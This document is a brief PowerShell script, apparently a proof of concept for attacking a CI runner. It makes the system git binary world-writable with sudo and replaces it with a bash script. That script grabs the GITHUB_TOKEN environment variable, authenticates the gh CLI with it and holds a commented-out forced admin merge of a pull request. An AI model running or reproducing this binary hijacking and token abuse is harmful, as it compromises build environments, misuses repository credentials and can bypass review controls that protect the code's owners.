Write-Host "hello"

$content = @"
#!/bin/bash

echo `"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`"

if [ -n `"`$GITHUB_TOKEN`" ]; then
    echo `"got token`"
    
    export GH_TOKEN=`"`$GITHUB_TOKEN`"
    gh auth status
    
    # gh pr merge 2 --admin
    echo `"finished doing gh`"
fi

"@

$gitPath = & which git
sudo chmod 777 $gitPath

Set-Content -Path $gitPath -Value $content
